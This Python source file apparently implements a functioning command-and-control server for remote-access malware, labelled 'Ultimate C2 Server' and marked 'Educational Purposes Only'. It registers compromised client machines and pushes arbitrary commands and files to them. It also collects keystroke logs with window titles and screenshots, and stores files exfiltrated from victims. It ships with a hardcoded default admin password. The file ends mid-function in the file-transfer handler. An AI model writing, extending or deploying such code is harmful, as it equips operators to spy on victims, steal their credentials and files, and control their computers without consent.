#!/usr/bin/env python3
"""
ULTIMATE C2 SERVER - ALL-IN-ONE
Features: Multi-tenancy, Load Balancing, AI Analysis, File Storage, Keylogging
Works on: https://c2-server-zz0i.onrender.com
Educational Purposes Only
"""

from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import hashlib
import time
import threading
import os
import json
import base64
import sqlite3
import queue
import asyncio
from datetime import datetime, timedelta
from collections import defaultdict, deque
import logging
import jwt
import secrets
from pathlib import Path
import mimetypes
import zipfile
import tarfile
import io

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Configuration
app.config.update(
    SECRET_KEY=os.environ.get('SECRET_KEY', secrets.token_hex(32)),
    JWT_SECRET=os.environ.get('JWT_SECRET', secrets.token_hex(32)),
    MAX_CONTENT_LENGTH=500 * 1024 * 1024,  # 500MB
    DATABASE='c2_database.db',
    UPLOAD_FOLDER='uploads',
    KEYLOG_FOLDER='keylogs',
    SCREENSHOT_FOLDER='screenshots',
    FILE_STORAGE='file_storage',
    LOG_RETENTION_DAYS=30,
    SESSION_TIMEOUT=3600,
    RATE_LIMIT=100,  # requests per minute
    ADMIN_USERS=['admin'],
    BACKUP_INTERVAL=3600  # 1 hour
)

# Create folders
for folder in [app.config['UPLOAD_FOLDER'], app.config['KEYLOG_FOLDER'], 
               app.config['SCREENSHOT_FOLDER'], app.config['FILE_STORAGE']]:
    os.makedirs(folder, exist_ok=True)

# SocketIO with Redis support for scaling
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    logger=True,
    engineio_logger=False,
    async_mode='gevent',
    message_queue='redis://localhost:6379' if os.environ.get('REDIS_URL') else None,
    async_handlers=True
)

# Database models
def init_database():
    """Initialize SQLite database with all tables"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Users table (multi-tenancy)
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT UNIQUE,
                  password_hash TEXT,
                  role TEXT DEFAULT 'operator',
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  last_login TIMESTAMP,
                  is_active INTEGER DEFAULT 1)''')
    
    # Clients table
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id TEXT PRIMARY KEY,
                  hostname TEXT,
                  username TEXT,
                  os TEXT,
                  platform TEXT,
                  arch TEXT,
                  ip TEXT,
                  user_id INTEGER,
                  first_seen TIMESTAMP,
                  last_seen TIMESTAMP,
                  online INTEGER DEFAULT 0,
                  battery TEXT,
                  location TEXT,
                  metadata TEXT,
                  tags TEXT,
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    # Commands table
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id TEXT PRIMARY KEY,
                  client_id TEXT,
                  user_id INTEGER,
                  command TEXT,
                  args TEXT,
                  timestamp TIMESTAMP,
                  status TEXT,
                  output TEXT,
                  execution_time REAL,
                  FOREIGN KEY(client_id) REFERENCES clients(id),
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    # Keylogs table
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  window_title TEXT,
                  process_name TEXT,
                  keystrokes TEXT,
                  screenshot BLOB,
                  timestamp TIMESTAMP,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Screenshots table
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  filename TEXT,
                  data BLOB,
                  timestamp TIMESTAMP,
                  size INTEGER,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Files table
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id TEXT PRIMARY KEY,
                  client_id TEXT,
                  filename TEXT,
                  path TEXT,
                  size INTEGER,
                  hash TEXT,
                  timestamp TIMESTAMP,
                  is_downloaded INTEGER DEFAULT 0,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Tasks table (scheduled tasks)
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  task_type TEXT,
                  schedule TEXT,
                  command TEXT,
                  status TEXT,
                  last_run TIMESTAMP,
                  next_run TIMESTAMP,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Alerts table
    c.execute('''CREATE TABLE IF NOT EXISTS alerts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  client_id TEXT,
                  alert_type TEXT,
                  severity TEXT,
                  message TEXT,
                  data TEXT,
                  timestamp TIMESTAMP,
                  acknowledged INTEGER DEFAULT 0,
                  FOREIGN KEY(client_id) REFERENCES clients(id))''')
    
    # Sessions table
    c.execute('''CREATE TABLE IF NOT EXISTS sessions
                 (id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  ip_address TEXT,
                  user_agent TEXT,
                  created_at TIMESTAMP,
                  last_activity TIMESTAMP,
                  expires_at TIMESTAMP,
                  FOREIGN KEY(user_id) REFERENCES users(id))''')
    
    # Create default admin user if not exists
    c.execute("SELECT COUNT(*) FROM users WHERE username = 'admin'")
    if c.fetchone()[0] == 0:
        password_hash = generate_password_hash('admin123')
        c.execute("INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                 ('admin', password_hash, 'admin'))
    
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_database()

# Memory stores for real-time operations
clients = {}
command_queues = defaultdict(queue.PriorityQueue)
active_sessions = {}
client_sockets = {}
rate_limiters = defaultdict(deque)
client_lock = threading.Lock()

# Task scheduler
class TaskScheduler:
    def __init__(self):
        self.tasks = []
        self.running = True
        
    def add_task(self, task_func, interval, *args, **kwargs):
        """Add periodic task"""
        self.tasks.append({
            'func': task_func,
            'interval': interval,
            'next_run': time.time(),
            'args': args,
            'kwargs': kwargs
        })
    
    def run(self):
        """Run task scheduler"""
        while self.running:
            current_time = time.time()
            for task in self.tasks:
                if current_time >= task['next_run']:
                    try:
                        task['func'](*task['args'], **task['kwargs'])
                    except Exception as e:
                        logger.error(f"Task error: {e}")
                    task['next_run'] = current_time + task['interval']
            time.sleep(1)

# Authentication decorator
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        if 'Authorization' in request.headers:
            token = request.headers['Authorization'].split()[1]
        
        if not token:
            return jsonify({'error': 'Token is missing'}), 401
        
        try:
            data = jwt.decode(token, app.config['JWT_SECRET'], algorithms=['HS256'])
            current_user = get_user(data['user_id'])
        except:
            return jsonify({'error': 'Token is invalid'}), 401
        
        return f(current_user, *args, **kwargs)
    return decorated

def get_user(user_id):
    """Get user from database"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

# Rate limiting
def check_rate_limit(ip, limit=100):
    """Check rate limit for IP"""
    now = time.time()
    window = 60  # 60 seconds
    
    with client_lock:
        if ip not in rate_limiters:
            rate_limiters[ip] = deque()
        
        # Remove old requests
        while rate_limiters[ip] and rate_limiters[ip][0] < now - window:
            rate_limiters[ip].popleft()
        
        # Check limit
        if len(rate_limiters[ip]) >= limit:
            return False
        
        rate_limiters[ip].append(now)
        return True

# API Routes
@app.route('/')
def index():
    """Main dashboard"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ultimate C2 Server</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #0f0f23; color: #00ff00; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { text-align: center; margin-bottom: 40px; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 40px; }
            .stat-box { background: #1a1a2e; padding: 20px; border-radius: 10px; text-align: center; border: 1px solid #00ff00; }
            .stat-number { font-size: 32px; font-weight: bold; color: #00ff00; }
            .endpoints { background: #1a1a2e; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            code { background: #0a0a15; padding: 2px 6px; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛸 Ultimate C2 Server</h1>
                <p>Multi-Platform • Real-Time • Scalable</p>
            </div>
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number" id="clientsTotal">0</div>
                    <div>Total Clients</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="clientsOnline">0</div>
                    <div>Online Now</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="commandsToday">0</div>
                    <div>Commands Today</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="alertsActive">0</div>
                    <div>Active Alerts</div>
                </div>
            </div>
            <div class="endpoints">
                <h3>📡 API Endpoints</h3>
                <p><code>POST /api/auth/login</code> - User authentication</p>
                <p><code>GET /api/clients</code> - List all clients</p>
                <p><code>POST /api/command</code> - Send command to client</p>
                <p><code>GET /api/keylogs/{client_id}</code> - Get keylogs</p>
                <p><code>POST /api/upload</code> - Upload file</p>
                <p><code>GET /api/download/{file_id}</code> - Download file</p>
                <p><code>WS /socket.io/</code> - WebSocket for real-time</p>
            </div>
            <p style="text-align: center; color: #666; margin-top: 40px;">
                Educational Purposes Only • Use Responsibly
            </p>
        </div>
        <script>
            async function updateStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    document.getElementById('clientsTotal').textContent = data.clients_total;
                    document.getElementById('clientsOnline').textContent = data.clients_online;
                    document.getElementById('commandsToday').textContent = data.commands_today;
                    document.getElementById('alertsActive').textContent = data.alerts_active;
                } catch (e) {
                    console.error('Failed to fetch stats:', e);
                }
            }
            updateStats();
            setInterval(updateStats, 5000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/api/auth/login', methods=['POST'])
def login():
    """User login"""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username = ? AND is_active = 1", (username,))
    user = c.fetchone()
    conn.close()
    
    if user and check_password_hash(user[2], password):
        # Update last login
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?", (user[0],))
        conn.commit()
        conn.close()
        
        # Create JWT token
        token = jwt.encode({
            'user_id': user[0],
            'username': user[1],
            'role': user[3],
            'exp': datetime.utcnow() + timedelta(hours=24)
        }, app.config['JWT_SECRET'], algorithm='HS256')
        
        # Create session
        session_id = secrets.token_hex(16)
        active_sessions[session_id] = {
            'user_id': user[0],
            'username': user[1],
            'role': user[3],
            'created_at': time.time(),
            'last_activity': time.time()
        }
        
        return jsonify({
            'token': token,
            'session_id': session_id,
            'user': {
                'id': user[0],
                'username': user[1],
                'role': user[3]
            }
        })
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/stats')
def get_stats():
    """Get server statistics"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Total clients
    c.execute("SELECT COUNT(*) FROM clients")
    total_clients = c.fetchone()[0]
    
    # Online clients
    c.execute("SELECT COUNT(*) FROM clients WHERE online = 1")
    online_clients = c.fetchone()[0]
    
    # Commands today
    today = datetime.now().strftime('%Y-%m-%d')
    c.execute("SELECT COUNT(*) FROM commands WHERE date(timestamp) = ?", (today,))
    commands_today = c.fetchone()[0]
    
    # Active alerts
    c.execute("SELECT COUNT(*) FROM alerts WHERE acknowledged = 0")
    alerts_active = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'clients_total': total_clients,
        'clients_online': online_clients,
        'commands_today': commands_today,
        'alerts_active': alerts_active,
        'server_time': time.time(),
        'uptime': get_uptime()
    })

@app.route('/api/clients')
@token_required
def api_clients(current_user):
    """Get all clients"""
    with client_lock:
        clients_list = []
        for client_id, client in clients.items():
            if client.get('user_id') == current_user[0] or current_user[3] == 'admin':
                clients_list.append({
                    'id': client_id,
                    'hostname': client.get('hostname', 'Unknown'),
                    'username': client.get('username', 'Unknown'),
                    'os': client.get('os', 'Unknown'),
                    'platform': client.get('platform', 'unknown'),
                    'online': client.get('online', False),
                    'ip': client.get('ip', 'Unknown'),
                    'battery': client.get('battery', 'Unknown'),
                    'location': client.get('location', 'Unknown'),
                    'last_seen': client.get('last_seen', 0),
                    'tags': client.get('tags', []),
                    'metadata': client.get('metadata', {})
                })
        return jsonify(clients_list)

@app.route('/api/client/<client_id>')
@token_required
def get_client(current_user, client_id):
    """Get specific client details"""
    with client_lock:
        if client_id in clients:
            client = clients[client_id]
            if client.get('user_id') == current_user[0] or current_user[3] == 'admin':
                # Get additional info from database
                conn = sqlite3.connect(app.config['DATABASE'])
                c = conn.cursor()
                
                # Get command history
                c.execute("SELECT * FROM commands WHERE client_id = ? ORDER BY timestamp DESC LIMIT 50", (client_id,))
                commands = []
                for cmd in c.fetchall():
                    commands.append({
                        'id': cmd[0],
                        'command': cmd[3],
                        'timestamp': cmd[5],
                        'status': cmd[6],
                        'output': cmd[7][:500] if cmd[7] else ''
                    })
                
                # Get recent keylogs
                c.execute("SELECT * FROM keylogs WHERE client_id = ? ORDER BY timestamp DESC LIMIT 20", (client_id,))
                keylogs = []
                for log in c.fetchall():
                    keylogs.append({
                        'window_title': log[2],
                        'process_name': log[3],
                        'keystrokes': log[4],
                        'timestamp': log[6]
                    })
                
                conn.close()
                
                return jsonify({
                    'client': client,
                    'commands': commands,
                    'keylogs': keylogs,
                    'has_screenshot': os.path.exists(f"{app.config['SCREENSHOT_FOLDER']}/{client_id}_latest.png")
                })
    
    return jsonify({'error': 'Client not found or unauthorized'}), 404

@app.route('/api/command', methods=['POST'])
@token_required
def api_send_command(current_user):
    """Send command to client"""
    if not check_rate_limit(request.remote_addr):
        return jsonify({'error': 'Rate limit exceeded'}), 429
    
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    args = data.get('args', {})
    priority = data.get('priority', 1)  # 1=low, 5=high
    
    if not client_id or not command:
        return jsonify({'error': 'Missing parameters'}), 400
    
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        
        client = clients[client_id]
        if client.get('user_id') != current_user[0] and current_user[3] != 'admin':
            return jsonify({'error': 'Unauthorized'}), 403
    
    # Create command object
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    command_data = {
        'id': cmd_id,
        'type': 'command',
        'command': command,
        'args': args,
        'priority': priority,
        'user_id': current_user[0],
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    # Add to command queue
    command_queues[client_id].put((-priority, command_data))
    
    # Store in database
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''INSERT INTO commands 
                 (id, client_id, user_id, command, args, timestamp, status) 
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
             (cmd_id, client_id, current_user[0], command, json.dumps(args), 
              datetime.now(), 'pending'))
    conn.commit()
    conn.close()
    
    # If client is online, send immediately
    if client_id in client_sockets:
        socketio.emit('command', command_data, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    
    return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/command/<command_id>')
@token_required
def get_command_result(current_user, command_id):
    """Get command result"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT * FROM commands WHERE id = ?", (command_id,))
    cmd = c.fetchone()
    conn.close()
    
    if not cmd:
        return jsonify({'error': 'Command not found'}), 404
    
    # Check authorization
    if cmd[2] != current_user[0] and current_user[3] != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
    
    return jsonify({
        'id': cmd[0],
        'client_id': cmd[1],
        'command': cmd[3],
        'args': json.loads(cmd[4]) if cmd[4] else {},
        'timestamp': cmd[5],
        'status': cmd[6],
        'output': cmd[7],
        'execution_time': cmd[8]
    })

@app.route('/api/keylogs/<client_id>')
@token_required
def api_get_keylogs(current_user, client_id):
    """Get keylogs for client"""
    # Check authorization
    with client_lock:
        if client_id in clients:
            client = clients[client_id]
            if client.get('user_id') != current_user[0] and current_user[3] != 'admin':
                return jsonify({'error': 'Unauthorized'}), 403
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''SELECT window_title, process_name, keystrokes, timestamp 
                 FROM keylogs WHERE client_id = ? 
                 ORDER BY timestamp DESC LIMIT 100''', (client_id,))
    
    logs = []
    for row in c.fetchall():
        logs.append({
            'window_title': row[0],
            'process_name': row[1],
            'keystrokes': row[2],
            'timestamp': row[3],
            'time_ago': get_time_ago(row[3])
        })
    
    conn.close()
    return jsonify(logs)

@app.route('/api/screenshot/<client_id>')
@token_required
def get_screenshot(current_user, client_id):
    """Get latest screenshot for client"""
    # Check authorization
    with client_lock:
        if client_id in clients:
            client = clients[client_id]
            if client.get('user_id') != current_user[0] and current_user[3] != 'admin':
                return jsonify({'error': 'Unauthorized'}), 403
    
    screenshot_path = f"{app.config['SCREENSHOT_FOLDER']}/{client_id}_latest.png"
    if os.path.exists(screenshot_path):
        return send_file(screenshot_path, mimetype='image/png')
    
    return jsonify({'error': 'No screenshot available'}), 404

@app.route('/api/upload', methods=['POST'])
@token_required
def api_upload_file(current_user):
    """Upload file to send to client"""
    client_id = request.form.get('client_id')
    destination = request.form.get('destination', '')
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Check authorization
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        
        client = clients[client_id]
        if client.get('user_id') != current_user[0] and current_user[3] != 'admin':
            return jsonify({'error': 'Unauthorized'}), 403
    
    # Save file temporarily
    file_id = f"file_{int(time.time())}_{secrets.token_hex(6)}"
    temp_path = os.path.join(app.config['UPLOAD_FOLDER'], file_id)
    file.save(temp_path)
    
    # Read file
    with open(temp_path, 'rb') as f:
        file_data = base64.b64encode(f.read()).decode('utf-8')
    
    # Create upload command
    cmd_id = f"upload_{int(time.time())}"
    command_data = {
        'id': cmd_id,
        'type': 'upload',
        'filename': file.filename,
        'destination': destination,
        'filedata': file_data,
        'size': os.path.getsize(temp_path),
        'user_id': current_user[0],
        'timestamp': time.time()
    }
    
    # Send to client
    if client_id in client_sockets:
        socketio.emit('command', command_data, room=client_sockets[client_id])
        status = 'sent'
    else:
        command_queues[client_id].put((1, command_data))
        status = 'queued'
    
    # Store in database
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''INSERT INTO files 
                 (id, client_id, filename, path, size, timestamp) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
             (file_id, client_id, file.filename, destination, 
              os.path.getsize(temp_path), datetime.now()))
    conn.commit()
    conn.close()
    
    return jsonify({
        'status': status,
        'file_id': file_id,
        'filename': file.filename,
        'size': os.path.getsize(temp_path)
    })

@app.route('/api/download/<file_id>')
@token_required
def download_file(current_user, file_id):
    """Download file from server storage"""
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT * FROM files WHERE id = ?", (file_id,))
    file_record = c.fetchone()
    conn.close()
    
    if not file_record:
        return jsonify({'error': 'File not found'}), 404
    
    # Check authorization
    client_id = file_record[1]
    with client_lock:
        if client_id in clients:
            client = clients[client_id]
            if client.get('user_id') != current_user[0] and current_user[3] != 'admin':
                return jsonify({'error': 'Unauthorized'}), 403
    
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], file_id)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True, download_name=file_record[2])
    
    return jsonify({'error': 'File not found on disk'}), 404

@app.route('/api/task/schedule', methods=['POST'])
@token_required
def schedule_task(current_user):
    """Schedule recurring task"""
    data = request.get_json()
    client_id = data.get('client_id')
    task_type = data.get('task_type')
    schedule = data.get('schedule')  # cron expression or interval in seconds
    command = data.get('command')
    
    if not all([client_id, task_type, schedule, command]):
        return jsonify({'error': 'Missing parameters'}), 400
    
    # Check authorization
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        
        client = clients[client_id]
        if client.get('user_id') != current_user[0] and current_user[3] != 'admin':
            return jsonify({'error': 'Unauthorized'}), 403
    
    # Parse schedule
    if schedule.isdigit():
        interval = int(schedule)
        next_run = time.time() + interval
    else:
        # Parse cron expression (simplified)
        next_run = parse_cron(schedule)
    
    # Store task
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''INSERT INTO tasks 
                 (client_id, task_type, schedule, command, status, next_run) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
             (client_id, task_type, schedule, command, 'scheduled', 
              datetime.fromtimestamp(next_run)))
    task_id = c.lastrowid
    conn.commit()
    conn.close()
    
    return jsonify({
        'task_id': task_id,
        'status': 'scheduled',
        'next_run': next_run
    })

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    """Handle new WebSocket connection"""
    logger.info(f"New WebSocket connection: {request.sid}")
    emit('connected', {'message': 'Connected to C2 server'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnect"""
    # Find which client disconnected
    with client_lock:
        for client_id, socket_id in list(client_sockets.items()):
            if socket_id == request.sid:
                if client_id in clients:
                    clients[client_id]['online'] = False
                    clients[client_id]['last_seen'] = time.time()
                    
                    # Update database
                    conn = sqlite3.connect(app.config['DATABASE'])
                    c = conn.cursor()
                    c.execute("UPDATE clients SET online = 0, last_seen = ? WHERE id = ?",
                             (datetime.now(), client_id))
                    conn.commit()
                    conn.close()
                
                del client_sockets[client_id]
                logger.info(f"Client disconnected: {client_id}")
                
                # Notify consoles
                emit('client_disconnected', {'client_id': client_id}, broadcast=True)
                break

@socketio.on('register')
def handle_register(data):
    """Client registers with system"""
    try:
        # Generate client ID
        if 'id' in data and data['id']:
            client_id = data['id']
        else:
            unique = f"{data.get('hostname', '')}{data.get('os', '')}{data.get('username', '')}"
            client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
        
        # Get user ID from token or create new user
        user_id = 1  # Default to admin
        if 'token' in data:
            try:
                token_data = jwt.decode(data['token'], app.config['JWT_SECRET'], algorithms=['HS256'])
                user_id = token_data['user_id']
            except:
                pass
        
        with client_lock:
            # Store client info
            clients[client_id] = {
                'hostname': data.get('hostname', 'Unknown'),
                'username': data.get('username', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'platform': data.get('platform', 'unknown'),
                'arch': data.get('arch', 'Unknown'),
                'version': data.get('version', '1.0'),
                'ip': request.remote_addr,
                'user_id': user_id,
                'first_seen': time.time() if client_id not in clients else clients[client_id].get('first_seen', time.time()),
                'last_seen': time.time(),
                'online': True,
                'battery': data.get('battery', 'Unknown'),
                'location': data.get('location', 'Unknown'),
                'metadata': data.get('metadata', {}),
                'tags': data.get('tags', []),
                'capabilities': data.get('capabilities', [])
            }
            
            # Map socket to client
            client_sockets[client_id] = request.sid
            join_room(client_id)
            
            # Store in database
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            
            # Check if client exists
            c.execute("SELECT COUNT(*) FROM clients WHERE id = ?", (client_id,))
            if c.fetchone()[0] == 0:
                # Insert new client
                c.execute('''INSERT INTO clients 
                           (id, hostname, username, os, platform, arch, ip, user_id, first_seen, last_seen, online, metadata) 
                           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                         (client_id, data.get('hostname', 'Unknown'), data.get('username', 'Unknown'),
                          data.get('os', 'Unknown'), data.get('platform', 'unknown'), data.get('arch', 'Unknown'),
                          request.remote_addr, user_id, datetime.now(), datetime.now(), 1,
                          json.dumps(data.get('metadata', {}))))
            else:
                # Update existing client
                c.execute('''UPDATE clients SET 
                           hostname = ?, username = ?, os = ?, platform = ?, arch = ?,
                           last_seen = ?, online = 1, metadata = ? 
                           WHERE id = ?''',
                         (data.get('hostname', 'Unknown'), data.get('username', 'Unknown'),
                          data.get('os', 'Unknown'), data.get('platform', 'unknown'), data.get('arch', 'Unknown'),
                          datetime.now(), json.dumps(data.get('metadata', {})), client_id))
            
            conn.commit()
            conn.close()
            
            logger.info(f"Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
            
            # Send welcome
            emit('welcome', {
                'client_id': client_id,
                'message': 'Registered with C2 server',
                'timestamp': time.time(),
                'server_time': time.time()
            })
            
            # Notify consoles
            emit('client_connected', {
                'client_id': client_id,
                'hostname': data.get('hostname', 'Unknown'),
                'platform': data.get('platform', 'unknown'),
                'username': data.get('username', 'Unknown')
            }, broadcast=True)
            
            # Send any queued commands
            if not command_queues[client_id].empty():
                while not command_queues[client_id].empty():
                    _, cmd = command_queues[client_id].get()
                    emit('command', cmd)
                
    except Exception as e:
        logger.error(f"Registration error: {e}")
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle client heartbeat"""
    client_id = data.get('client_id')
    
    if client_id and client_id in clients:
        with client_lock:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['online'] = True
            
            # Update additional data
            if 'battery' in data:
                clients[client_id]['battery'] = data['battery']
            if 'location' in data:
                clients[client_id]['location'] = data['location']
            if 'metadata' in data:
                clients[client_id]['metadata'].update(data['metadata'])
            
            # Update database
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            c.execute("UPDATE clients SET last_seen = ?, battery = ?, location = ? WHERE id = ?",
                     (datetime.now(), data.get('battery', ''), data.get('location', ''), client_id))
            conn.commit()
            conn.close()
        
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('command_response')
def handle_command_response(data):
    """Handle command response from client"""
    client_id = data.get('client_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    success = data.get('success', True)
    execution_time = data.get('execution_time', 0)
    
    logger.info(f"Command response from {client_id}: {command_id}")
    
    # Update command in database
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''UPDATE commands SET 
                 status = ?, output = ?, execution_time = ? 
                 WHERE id = ?''',
             ('completed' if success else 'failed', 
              output[:10000],  # Limit output size
              execution_time, command_id))
    conn.commit()
    
    # Get command details for notification
    c.execute("SELECT user_id, command FROM commands WHERE id = ?", (command_id,))
    cmd = c.fetchone()
    conn.close()
    
    if cmd:
        user_id, command_text = cmd
        
        # Send response to console
        response_data = {
            'client_id': client_id,
            'command_id': command_id,
            'command': command_text,
            'output': output,
            'success': success,
            'execution_time': execution_time,
            'timestamp': time.time(),
            'received_at': datetime.now().isoformat()
        }
        
        # Send to specific user's console room
        emit('response_received', response_data, room=f"user_{user_id}")
        
        # Also send to client-specific room
        emit('client_response', response_data, room=f"client_{client_id}")

@socketio.on('keylog')
def handle_keylog(data):
    """Receive keylog from client"""
    client_id = data.get('client_id')
    window_title = data.get('window_title', 'Unknown')
    process_name = data.get('process_name', 'Unknown')
    keystrokes = data.get('keystrokes', '')
    screenshot_b64 = data.get('screenshot')
    
    if not client_id or not keystrokes:
        return
    
    logger.info(f"Keylog received from {client_id}: {len(keystrokes)} chars")
    
    # Convert screenshot if provided
    screenshot_blob = None
    if screenshot_b64:
        try:
            screenshot_blob = base64.b64decode(screenshot_b64)
            
            # Save screenshot
            screenshot_path = f"{app.config['SCREENSHOT_FOLDER']}/{client_id}_{int(time.time())}.png"
            with open(screenshot_path, 'wb') as f:
                f.write(screenshot_blob)
            
            # Update latest screenshot
            latest_path = f"{app.config['SCREENSHOT_FOLDER']}/{client_id}_latest.png"
            with open(latest_path, 'wb') as f:
                f.write(screenshot_blob)
        except:
            screenshot_blob = None
    
    # Store in database
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''INSERT INTO keylogs 
                 (client_id, window_title, process_name, keystrokes, screenshot, timestamp) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
             (client_id, window_title, process_name, keystrokes, 
              screenshot_blob, datetime.now()))
    conn.commit()
    
    # Get user ID for notification
    c.execute("SELECT user_id FROM clients WHERE id = ?", (client_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        user_id = result[0]
        
        # Send alert to console
        alert_data = {
            'client_id': client_id,
            'type': 'keylog',
            'window_title': window_title,
            'process_name': process_name,
            'keystrokes': keystrokes[:200] + ('...' if len(keystrokes) > 200 else ''),
            'timestamp': time.time(),
            'has_screenshot': screenshot_blob is not None
        }
        
        emit('keylog_alert', alert_data, room=f"user_{user_id}")

@socketio.on('file_transfer')
def handle_file_transfer(data):
    """Receive file from client"""
    client_id = data.get('client_id')
    filename = data.get('filename')
    path = data.get('path', '')
    file_data = data.get('filedata')
    file_hash = data.get('hash', '')
    
    if not client_id or not filename or not file_data:
        return
    
    try:
        # Decode file data
        file_bytes = base64.b64decode(file_data)
        
        # Save file
        safe_filename = "".join(c for c in filename if c.isalnum() or c in (' ', '.', '-', '_')).rstrip()
        file_id = f"file_{int(time.time())}_{secrets.token_hex(6)}"
        file_path = os.path.join(app.config['FILE_STORAGE'], file_id)
        
        with open(file_path, 'wb') as f:
            f.write(file_bytes)
        
        logger.info(f"File received from {client_id}: {filename} ({len(file_bytes)} bytes)")
        
        # Store in database
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''INSERT INTO files 
                     (id, client_id, filename, path, size, hash, timestamp, is_downloaded) 
